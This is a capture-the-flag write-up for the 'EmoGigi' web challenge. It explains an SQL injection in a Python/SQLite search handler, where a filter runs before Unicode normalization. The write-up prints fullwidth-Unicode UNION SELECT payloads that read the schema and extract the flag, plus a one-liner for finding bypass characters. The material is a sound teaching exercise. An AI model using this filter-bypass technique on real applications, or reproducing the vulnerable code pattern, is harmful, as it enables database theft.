# EmoGigi

On the main page we can see a search box for emojis and a table with a list of results/all the available emojis with their identifier.
The challenge provides also a file called `Message.txt`, in which we can observe what seems like an email from the ovwner of the site where we can see some code:
```
def search():
    # [... SNIP ...] Init the variables here
    
    # Custom SQL filter
    query = sqlfilter(request.form['query'])
    
    # [... SNIP ...]

    if query is None:
        # [... SNIP ...] Return an error here
    else:
        # Normalize weird chars here
        norm = unicodedata.normalize("NFKD", query).encode('ascii', 'ignore').decode('ascii')
        
        # Custom HTML filter
        query = htmlfilter(norm)
        
        conn = sqlite.connect('./emoji.db')
        cur = conn.cursor()

        # Prefix:   f09f90
        # Range:    80;c0
        # Category: animals
        result = cur.execute("SELECT prefix,range,category,id FROM emoji WHERE category like '%" + query + "%'").fetchall()
        conn.close()

        # No Results
        if len(result) == 0:
            return index()

        # [... SNIP ...] Build the results table here
        for r in result:
            rng = r[1].split(';')
            emoji += '<div class="category"><div id="lh"></div>' + r[2].upper() + '<div id="rh"></div></div>'
            emoji += emoji_gen(bytes.fromhex(r[0]), int(rng[0], 16), int(rng[1], 16))
            
        # [... SNIP ...]

    return render_template('index.html', error=error, emoji=emoji, pages=pages, query=query), 200
```

The first important thing that we can notice is the concatenation of user input and SQL query directly, which looks like textboox SQL injection:
```
result = cur.execute("SELECT prefix,range,category,id FROM emoji WHERE category like '%" + query + "%'").fetchall()
```

However, trying with some inputs like `' OR 1=1 --;` or simply `' --` we get an error message, in fact, we can observe the following operationgs on the user's input:
```
query = sqlfilter(request.form['query'])
norm = unicodedata.normalize("NFKD", query).encode('ascii', 'ignore').decode('ascii')
query = htmlfilter(norm)
```

So, there is a custom sql escape sanitization (function `sqlfilter`) done before before normalization, which means that we can send a query written in unicode characters and this query would be normalized to the ascii version bypassing the filter.
This because the second line in the snippet above is meant to normalize weird Unicode characters and remove all non-ascii characters from the result, but the SQL sanitization has already been done.
We need unicodedata.normalize to output the special characters we need in order to perform SQLi.

We can find characters that normalize `'` with python, using the following one-liner:
```
print([c for c in range(0x10ffff) if unicodedata.normalize("NFKD", chr(c)) == "'"][1:][0])
```
Otherwise, we can also use a unicode fullwidth converter online to write the queries in unicode that we need:
```
＇    ｕｎｉｏｎ ＳＥＬＥＣＴ ＇ｐｒｅｆｉｘ＇，90，＇ｐｒｅｆｉｘ＇，name ｆｒｏｍ  ｓｑｌｉｔｅ＿ｓｃｈｅｍａ   －－
```

allows us to retrieve the table name `r3plych4ll3ng3fl4g`, and then with:
```
＇　ｕｎｉｏｎ　ＳＥＬＥＣＴ　＇ｐｒｅｆｉｘ＇，　９０，　＇ｐｒｅｆｉｘ＇，　　ｖａｌｕｅ　ｆｒｏｍ　ｒ３ｐｌｙｃｈ４ｌｌ３ｎｇ３ｆｌ４ｇ　　－－
```

we get the flag `{FLG:O0O0OP5_1_H4V3_B33N_PWN3D_(54DF4C3)!}`.
